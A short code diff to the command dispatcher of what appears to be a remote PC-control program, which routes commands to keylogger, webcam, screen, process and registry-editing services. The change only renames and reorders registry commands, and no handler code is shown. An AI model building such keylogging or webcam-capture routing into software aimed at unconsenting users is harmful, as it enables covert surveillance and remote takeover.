@@ -1,6 +1,5 @@
 import shlex
 import constants
-import utils
 
 from services import app, help, keylogger, mac, pc, process, registry, screen, webcam, explorer
 from GlobalVariables import configs
@@ -43,10 +42,10 @@ request_tree = {
         'registry': {
             'get': [1, registry.get_value],
             'add_key': [1, registry.add_key],
-            'add_value': [3, registry.add_value],
+            'add_subkey': [3, registry.add_value],
             'modify': [3, registry.modify_value],
-            'delete': [1, registry.delete_key],
-            'delete_value': [1, registry.delete_value]
+            'delete_value': [1, registry.delete_value],
+            'delete_key': [1, registry.delete_key],
         },
         'explorer': {
             'tree': [1, explorer.show_tree],
